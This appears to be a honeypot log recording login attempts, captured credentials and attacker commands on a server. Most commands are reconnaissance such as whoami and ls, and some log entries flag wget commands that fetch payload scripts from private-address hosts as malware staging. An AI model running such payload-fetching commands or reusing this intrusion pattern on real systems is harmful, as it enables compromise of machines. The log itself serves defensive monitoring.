[2026-06-27 05:09:22] ID:17eef7331101 | ACTION:CONN_ATTEMPT | DATA:Source Port: 8936
[2026-06-27 05:09:40] ID:17eef7331101 | ACTION:CRED_CAPTURE | DATA:USER: 'stark' | PASS: 'hdjhfhryr'
[2026-06-27 05:16:21] ID:17eef7331101 | ACTION:CONN_ATTEMPT | DATA:Source Port: 9023
[2026-06-27 05:16:31] ID:17eef7331101 | ACTION:CRED_CAPTURE | DATA:USER: 'stark' | PASS: 'powelo'
[2026-06-27 05:16:42] ID:17eef7331101 | ACTION:CMD_EXEC | DATA:COMMAND: 'whoami'
[2026-06-27 05:16:51] ID:17eef7331101 | ACTION:CMD_EXEC | DATA:COMMAND: 'ls'
[2026-06-27 05:16:56] ID:17eef7331101 | ACTION:CMD_EXEC | DATA:COMMAND: 'ls-la'
[2026-06-27 05:24:24] ID:17eef7331101 | ACTION:CONN_ATTEMPT | DATA:Source Port: 9163
[2026-06-27 05:24:32] ID:17eef7331101 | ACTION:CRED_CAPTURE | DATA:USER: 'stark' | PASS: 'powelo'
[2026-06-27 05:24:35] ID:17eef7331101 | ACTION:CMD_EXEC | DATA:COMMAND: 'ls'
[2026-06-27 05:24:41] ID:17eef7331101 | ACTION:CMD_EXEC | DATA:COMMAND: 'dir'
[2026-06-27 05:26:12] ID:17eef7331101 | ACTION:CONN_ATTEMPT | DATA:Source Port: 9206
[2026-06-27 05:26:25] ID:17eef7331101 | ACTION:CRED_CAPTURE | DATA:USER: 'stark' | PASS: 'powello'
[2026-06-27 05:26:28] ID:17eef7331101 | ACTION:CMD_EXEC | DATA:COMMAND: 'ls'
[2026-06-27 05:26:34] ID:17eef7331101 | ACTION:CMD_EXEC | DATA:COMMAND: 'ls-la'
[2026-06-27 05:26:38] ID:17eef7331101 | ACTION:CMD_EXEC | DATA:COMMAND: 'whoami'
[2026-06-27 05:49:03] ID:d16d58191f0b | ACTION:CONN_ATTEMPT | DATA:Source Port: 9573
[2026-06-27 05:49:28] ID:d16d58191f0b | ACTION:CRED_CAPTURE | DATA:USER: 'root' | PASS: 'powello'
[2026-06-27 05:49:34] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'ls'
[2026-06-27 05:49:40] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'cd etc'
[2026-06-27 05:49:48] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'whois'
[2026-06-27 05:49:57] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'ls-laa'
[2026-06-27 05:50:03] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'ls-la'
[2026-06-27 05:50:16] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'exit'
[2026-06-27 05:54:46] ID:d16d58191f0b | ACTION:CONN_ATTEMPT | DATA:Source Port: 9675
[2026-06-27 05:54:50] ID:d16d58191f0b | ACTION:CRED_CAPTURE | DATA:USER: 'root' | PASS: 'POWELO'
[2026-06-27 05:54:58] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'LS'
[2026-06-27 05:55:01] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'ls'
[2026-06-27 05:55:04] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'ls-la'
[2026-06-27 05:55:11] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'whoami'
[2026-06-27 05:55:17] ID:d16d58191f0b | ACTION:CMD_EXEC | DATA:COMMAND: 'exit'
[2026-06-27 06:07:23] ID:17eef7331101 | LOC:LOCAL_LOOPBACK | ACTION:CONN_ATTEMPT | DATA:Source Port: 9751
[2026-06-27 06:07:27] ID:17eef7331101 | LOC:LOCAL_LOOPBACK | ACTION:CRED_CAPTURE | DATA:USER: 'root' | PASS: 'powelo'
[2026-06-27 06:07:31] ID:17eef7331101 | LOC:LOCAL_LOOPBACK | ACTION:CMD_EXEC | DATA:COMMAND: 'ls'
[2026-06-27 06:07:56] ID:17eef7331101 | LOC:LOCAL_LOOPBACK | ACTION:CMD_EXEC | DATA:COMMAND: ''
[2026-06-27 06:08:05] ID:17eef7331101 | LOC:LOCAL_LOOPBACK | ACTION:CMD_EXEC | DATA:COMMAND: 'wget http://192.168.1.50/malicious_worm_payload.sh'
[2026-06-27 06:08:05] ID:17eef7331101 | LOC:LOCAL_LOOPBACK | ACTION:MALWARE_STAGING | DATA:BLOB: 'wget http://192.168.1.50/malicious_worm_payload.sh' | EXTRACTED_C2: http://192.168.1.50/malicious_worm_payload.sh
[2026-06-27 06:13:29] ID:17eef7331101 | LOC:LOCAL_LOOPBACK | ACTION:CMD_EXEC | DATA:COMMAND: ''
[2026-06-27 06:13:32] ID:17eef7331101 | LOC:LOCAL_LOOPBACK | ACTION:CMD_EXEC | DATA:COMMAND: 'exit'
[2026-06-27 06:14:05] ID:17eef7331101 | LOC:Germany/Falkenstein (Hetzner Online GmbH) | ACTION:CONN_ATTEMPT | DATA:Source Port: 9828
[2026-06-27 06:14:10] ID:17eef7331101 | LOC:Germany/Falkenstein (Hetzner Online GmbH) | ACTION:CRED_CAPTURE | DATA:USER: 'root' | PASS: 'powelo'
[2026-06-27 06:14:17] ID:17eef7331101 | LOC:Germany/Falkenstein (Hetzner Online GmbH) | ACTION:CMD_EXEC | DATA:COMMAND: 'ls'
[2026-06-27 06:14:32] ID:17eef7331101 | LOC:Germany/Falkenstein (Hetzner Online GmbH) | ACTION:CMD_EXEC | DATA:COMMAND: ''
[2026-06-27 06:14:52] ID:17eef7331101 | LOC:Germany/Falkenstein (Hetzner Online GmbH) | ACTION:CMD_EXEC | DATA:COMMAND: '[A[B[C[C[C[C[C[D[D[D[D[D[D[D[D[Cddv'
[2026-06-27 06:15:02] ID:17eef7331101 | LOC:Germany/Falkenstein (Hetzner Online GmbH) | ACTION:CMD_EXEC | DATA:COMMAND: 'rr'
[2026-06-27 06:15:16] ID:17eef7331101 | LOC:Germany/Falkenstein (Hetzner Online GmbH) | ACTION:CMD_EXEC | DATA:COMMAND: 'wget http://10.10.10.5/payload.sh'
[2026-06-27 06:15:16] ID:17eef7331101 | LOC:Germany/Falkenstein (Hetzner Online GmbH) | ACTION:MALWARE_STAGING | DATA:BLOB: 'wget http://10.10.10.5/payload.sh' | EXTRACTED_C2: http://10.10.10.5/payload.sh
